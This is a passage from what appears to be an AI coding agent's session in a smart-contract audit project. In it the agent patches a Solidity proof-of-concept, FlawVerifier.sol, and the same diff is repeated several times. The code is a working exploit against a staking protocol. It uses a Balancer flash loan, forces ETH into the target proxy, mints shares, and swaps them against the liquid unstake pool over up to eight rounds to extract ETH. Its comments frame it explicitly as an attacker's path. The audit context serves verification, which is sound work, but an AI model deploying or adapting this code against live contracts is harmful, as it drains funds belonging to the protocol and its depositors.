++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+codex
+The patch is in; I’m doing a quick syntax pass now.
+exec
+/bin/bash -lc "sed -n '1,320p' FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 50ms:
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IWETH is IERC20Like {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+interface IStakingLike is IERC20Like {
+    function mint(uint256 shares, address receiver) external returns (uint256 assets);
+    function liquidUnstakePool() external view returns (address);
+    function previewMint(uint256 shares) external view returns (uint256 assets);
+}
+
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+exec
+/bin/bash -lc "sed -n '120,260p' FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 52ms:
+        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
+        uint256 shortfall = _fundingShortfallHint(desiredShares);
+        require(shortfall != 0, "candidate failed without top-up");
+
+        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+        require(quoteOk && quotedOut > 1, "candidate has no repayable swap quote");
+
+        if (shortfall >= quotedOut) {
+            shortfall = quotedOut - 1;
+        }
+
+        IERC20Like[] memory tokens = new IERC20Like[](1);
+        tokens[0] = IERC20Like(WETH);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = shortfall;
+
+        // exploit_paths[2]: optionally top up `TARGET_PROXY` with forced ETH to satisfy internal
+        // execution assumptions, using only public capital sourced in this transaction.
+        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(liquidPool, desiredShares));
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+exec
+/bin/bash -lc "sed -n '260,360p' FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 51ms:
+            poolHeldShares / 4,
+            poolHeldShares / 8,
+            poolHeldShares / 16,
+            MIN_SHARES
+        ];
+
+        uint256 bestEstimatedProfit;
+        uint256 previousProbe;
+
+        for (uint256 i = 0; i < probes.length; ++i) {
+            uint256 probe = probes[i];
+            if (probe < MIN_SHARES || probe == previousProbe) {
+                continue;
+            }
+
+            previousProbe = probe;
+
+            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
+            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
+                continue;
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
